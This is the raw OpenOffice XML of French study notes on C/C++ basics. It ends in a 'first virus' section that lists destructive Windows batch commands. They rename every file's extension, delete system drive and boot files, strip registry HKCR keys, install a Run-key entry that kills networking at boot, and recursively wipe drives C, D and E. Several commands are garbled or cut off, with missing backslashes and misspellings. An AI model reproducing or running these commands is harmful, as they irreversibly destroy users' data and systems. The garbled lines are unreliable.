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EF700000BFE34ED71D8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000040300000457577FEEA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ext_20_body">
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false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</style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L6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weight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à la programmation C sous Ubuntu :</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">Voir cours Udemy_1 p.4-5.</text:p>
      <text:p text:style-name="P2">La seule différence concrète, c'est l'include qui est iostream pour C++ et stdio.h en C. On a aussi printf contre cout. Mais sinon on a toujours la fonction int main() retournant 0 à la fin, les { } etc... </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Scripting languages (Python...) : automatiser des trucs. Langages compilés = on traduit par le compilateur en 1 et en 0 au lieu de faire lire à l'ordinateur ligne par ligne, le principal avantage étant que c'est <text:span text:style-name="T1">plus rapide</text:span>. </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Le compilateur gcc (pour programmes en .c) :</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">-E : ne compile que les includes (-S plutôt qui fait le même job en mieux). </text:p>
      <text:p text:style-name="P2">-o nomFichier : précise le fichier d'output. Ce qui peut être pas mal c'est d'ajouter l'extension .out à tes fichiers d'output qui n'ont pas d'extension normalement.</text:p>
      <text:p text:style-name="P2">-x &lt;language&gt; : précise le langage de compilation, même si gcc le fait automatiquement (c pour fichiers en .c etc...).</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">C++ et Kali Linux :</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">Exactement comme le C, sauf que notre fichier doit s'appeler main.cpp. Pour le compiler, on n'utilise pas gcc mais g++ (version C++ du compilateur gcc). </text:p>
      <text:p text:style-name="P2">Pareil une fois compilé, soit on a précisé un fichier d'output avec -o et alors on fait ./main.out, soit on fait ./a.out si on a rien précisé. </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">Run C code inside C++ : </text:p>
      <text:p text:style-name="P4">Pas si compliqué, les synthaxes sont quasiment identiques. Il suffit d'inclure la librairie standard de C, puis d'utiliser les fonctions comme si de rien n'était.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3">C++ getting user input :</text:p>
      <text:p text:style-name="P4">Bon normalement tu le sais déjà ça, mais un peu de rappel fait pas de mal. Pour récupérer l'input d'un utilisateur dans une variable :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">string message;</text:p>
      <text:p text:style-name="P4">cin &gt;&gt; message;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">cout &lt;&lt; "Vous avez écrit : " &lt;&lt; message &lt;&lt; endl;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">A NOTER que cin ne prend que le premier mot... C'est à dire qu'il ne reconnaît pas les espaces (mais les underscore, oui).</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">Premier virus :</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P4">Première fonction à utiliser qu'on connait pas en C++ : fonction().</text:p>
      <text:p text:style-name="P4">Fonction() ouvre simplement l'invite de commande d'un ordinateur. Si on marque quelque chose dedans, par exemple "ifconfig", ça exécute cette commande sur mon ordinateur. </text:p>
      <text:p text:style-name="P4"><text:soft-page-break/></text:p>
      <text:p text:style-name="P4">Rien que cette commande ça peut déjà être sacrément destructive si tu arrives à exécuter le programme sur un ordinateur LINUX, pour lequel l'invite de commande peut faire de sérieux dégâts :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images2" text:anchor-type="paragraph" svg:width="15.018cm" svg:height="16.251cm" draw:z-index="0"><draw:image xlink:href="Pictures/20000007000040300000457577FEEA7E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">Pas mal de possibilités déjà : retirer tous les fichiers du dossier root, on peut faire freeze le système, on peut overwrite les données d'un disque / les rendre irrécupérables. </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">NOTE : avec 4., il n'y a même pas la possibilité de récupérer les données !</text:p>
      <text:p text:style-name="P4">NOTE, BONUS :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images3" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.581cm" draw:z-index="1"><draw:image xlink:href="Pictures/2000000700004EF700000BFE34ED71D8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:soft-page-break/>Même sur Windows exécuter ce script (ou une succession de commandes system() dans le cas de Windows où on doit parfois exécuter plusieurs commandes) peut faire beaucoup de dégâts :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On peut :</text:p>
      <text:list xml:id="list2049144946697062625" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P11">Renommer tous les fichiers avec une extension différente de celle d'origine :</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P10">&gt; REN *.real_extension_name *.customised_Extension_name</text:p>
      <text:p text:style-name="P9">Example : &gt; REN *.doc *.txt REN *.JPEG *.txt REN *.lnk *.txt REN *.avi *.txt REN *.mkv *.txt REN *.BAT *.txt</text:p>
      <text:p text:style-name="P6">... Rename doc en txt, jpeg en txt, lnk en txt etc...</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"/>
      <text:list xml:id="list3377686987364450680" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P12">On peut provoquer un Blue Screen of Death en supprimant systemdrive :</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">&gt; @echo off<text:line-break/>&gt; delete %systemdrive%\*.* /f /s</text:span></text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"/></text:span></text:p>
      <text:list xml:id="list5653556978456582822" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P13"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3">La commande suivante supprime System32 de l'ordinateur, ce qui force à réinstaller Windows à partir de données de récupération. On le fait en attribuant aux fichiers clés certaines caractéristiques permettant le suppression, puis en appelant del.</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3"/></text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text">&gt; @echo off<text:line-break/>&gt; attrib -r -s -h c:\autoexec.bat<text:line-break/>&gt; del c:\autoexec.bat<text:line-break/>&gt; attrib -r -s -h c:\boot.ini<text:line-break/>&gt; del c:\boot.ini<text:line-break/>&gt; attrib -r -s -h c:\ntldr<text:line-break/>&gt; del c:\ntldr<text:line-break/>&gt; attrib -r -s -h c:\windows\win.ini<text:line-break/>&gt; del c:\windows\win.ini </text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3"/></text:span></text:p>
      <text:list xml:id="list6359953740426723329" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3">On peut aussi supprimer le Windows Registery, ce qui est un peu + sneaky puisque ça va "seulement" produire des problèmes en exécutant des applications.</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3"/></text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text">&gt; @echo off<text:line-break/>&gt; START reg delete HKCR/.exe<text:line-break/>&gt; START reg delete HKCR/.dll<text:line-break/>&gt; START reg delete HKCR/* </text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">(</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">HKEY_CLASSES_ROOT</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3"> (appelé HKCR) : elle contient toutes les associations de fichiers, le nom des premières clés correspond à l'extension de fichier à laquelle on s'intéresse.)</text:span></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3"/></text:span></text:p>
      <text:list xml:id="list6726292223412155482" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P15"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3">Désactiver Internet de l'ordinateur définitivement (intéressant)</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3"/></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T6">&gt; </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">echo @echo off&gt;c:windowswimn32.bat<text:line-break/>&gt; echo break off&gt;&gt;c:windowswimn32.bat<text:line-break/>&gt; echo ipconfig/release_all&gt;&gt;c:windowswimn32.bat<text:line-break/>&gt; echo end&gt;&gt;c:windowswimn32.bat<text:line-break/>&gt; reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t </text:span></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">&gt; reg_sz /d c:windowswimn32.bat /f<text:line-break/>&gt; reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window</text:span></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"/></text:span></text:p>
      <text:list xml:id="list5893585934599029818" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P16"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">On peut formater entièrement les disques HDD + le disque C :</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7"/></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">&gt; rd/s/q/ D:\<text:line-break/>&gt; rd/s/q/ C:\<text:line-break/>&gt; rd/s/q/ E:\ </text:span></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7"/></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">(c'est simplement la commande de formatage though).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5M52S</meta:editing-duration>
    <meta:editing-cycles>8</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.11$Win32 OpenOffice.org_project/4111m1$Build-9808</meta:generator>
    <dc:date>2022-01-30T18:48:28.13</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="2" meta:object-count="0" meta:page-count="4" meta:paragraph-count="45" meta:word-count="756" meta:character-count="4569"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>